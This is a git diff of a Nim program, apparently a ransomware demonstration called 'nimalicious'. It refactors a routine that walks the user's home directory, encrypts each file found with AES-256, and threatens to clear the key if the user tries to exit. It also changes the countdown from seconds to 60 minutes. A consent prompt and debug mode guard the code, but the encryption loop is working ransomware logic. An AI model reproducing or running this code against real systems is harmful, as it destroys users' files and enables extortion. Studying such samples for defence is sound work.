@@ -1,7 +1,7 @@
 # This is just an example to get you started. A typical binary package
 # uses this file as the main entry point of the application.
 import std/[base64, os]
-import nimalicious/[consent, crypto]
+import nimalicious/[consent, crypto, files]
 import nimcrypto
 
 when not defined(debug) and not defined(yesReallyDestroyMyMachine):
@@ -17,22 +17,6 @@ askConsent(
 )
 
 
-when defined(debug):
-  # Make a dummy file specifically to be encrypted and decrypted.
-  proc findFiles*(): seq[string] =
-    try:
-      writeFile("dummy_file.txt", "Hello World!")
-      return @["dummy_file.txt"]
-    except:
-      # Return nothing as a safe measure.
-      return @[]
-else:
-  # Search *everywhere* in the user's home directory.
-  proc findFiles*(): seq[string] =
-    for kind, path in walkDir(dir = getHomeDir(), skipSpecial = true):
-      if kind == pcFile: result.add(path)
-    return result
-
 # Initialize encryption.
 var algo: ECB[aes256]
 let key = genKey()
@@ -44,11 +28,11 @@ proc exit() {.noconv.} =
 setControlCHook(exit)
 
 
-let files = findFiles()
+let filesx = findFiles()
 var i = 0
-for file in files:
+for file in filesx:
   inc(i)
-  echo "Encrypting ", i, " file out of ", len(files), " files. (", file, ")"
+  echo "Encrypting ", i, " file out of ", len(filesx), " files. (", file, ")"
   var
     contents = autoPadStr(readFile(file), algo.sizeBlock())
     tmp = newString(len(contents))
@@ -62,7 +46,8 @@ echo "And any attempts to exit *will* clear the key."
 
 var time = 60
 while time != 0:
-  sleep(1000)
+  when defined(debug): sleep(100)
+  else: sleep(60000)
   dec(time)
   echo time, " minutes remaining."
 
